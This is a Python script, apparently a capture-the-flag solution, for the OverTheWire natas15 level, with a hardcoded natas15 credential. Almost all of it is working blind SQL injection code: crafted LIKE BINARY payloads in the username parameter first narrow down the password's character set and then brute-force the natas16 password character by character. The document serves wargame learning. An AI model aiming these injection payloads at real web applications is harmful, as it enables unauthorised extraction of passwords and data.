'''
This is a script that solves natas15 from http://overthewire.org/wargames/natas/natas16.html.
First the script reduces the character set search space by verifying that a character exists
in the password via SQL injection. If it is contained in the password it is stored into used_chars.
Once the reduced character set is obtained the script brute-forces the password using SQL injection
to test the validity of each character position in the password. Full write-up is at 
https://r00tblogger.wordpress.com/2019/01/29/overthewire-natas-wargame/
'''

import requests
import time

vocab = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
used_chars = ''
natas15_pass = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
natas16_pass = ''
url = "http://natas15:" + natas15_pass + '@natas15.natas.labs.overthewire.org/index.php'

print("Searching \"%s\" for characters used in password....\n" %vocab)
for character in vocab:
	result = requests.get(url + '?username=natas16" AND password LIKE BINARY "%' + character + '%" "')
	if result.content.find(b'exists') > 0:
		used_chars += character

print("[*] Characters used in password: \"" + used_chars + "\"\n[*] Beginning brute-force attack using \"" + used_chars + "\" characters")
start = time.time()
for i in range(32):
	for character in used_chars:	
		result = requests.get(url + '?username=natas16" AND password LIKE BINARY "' + natas16_pass + character + '%" "')
		if result.content.find(b'exists') > 0:
			natas16_pass += character
			break
elapsed = (time.time() - start) / 60
print("[*] natas16 : %s\n\nTime elapsed: %f minutes." %(natas16_pass, elapsed))
